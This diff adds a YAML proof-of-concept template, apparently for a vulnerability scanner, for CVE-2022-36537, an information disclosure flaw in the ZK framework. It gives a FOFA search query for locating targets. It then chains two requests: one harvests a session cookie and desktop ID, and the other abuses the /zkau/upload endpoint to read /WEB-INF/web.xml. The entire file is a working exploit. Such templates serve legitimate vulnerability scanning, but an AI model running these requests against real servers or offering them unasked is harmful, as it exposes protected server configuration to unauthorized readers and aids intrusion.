@@ -1,0 +1,33 @@
+id: poc-yaml-zkoss-zk-framework-information-disclosure
+info:
+  name: Zkoss Zk_framework信息泄露漏洞(CVE-2022-36537)
+  severity: high
+  tags:
+  - CVE-2022-36537
+  - 两高一弱
+  finger: zk_framework
+  fofa: title="Server backup manager"
+requests:
+- method: GET
+  path: /login.zul
+  expression: status_code == 200
+  output:
+  - regex_match(headers,"JSESSIONID=(?P<cookie>[a-z0-9A-Z]+)")
+  - regex_match(body,"(?P<dtid>z_[^,']+)")
+- method: POST
+  path: /zkau/upload?uuid=101010&dtid={{.dtid}}&sid=0&maxsize=-1
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCs6yB0zvpfSBbYEp
+    Cookie: JSESSIONID={{.cookie}}
+  data: '------WebKitFormBoundaryCs6yB0zvpfSBbYEp
+
+    Content-Disposition: form-data; name="nextURI"
+
+
+    /WEB-INF/web.xml
+
+    ------WebKitFormBoundaryCs6yB0zvpfSBbYEp--'
+  expression: status_code == 200 && contains(body,"<display-name>") && contains(body,"<welcome-file-list>")
+    && contains(body,"xml")
+variables: {}
+transport: http
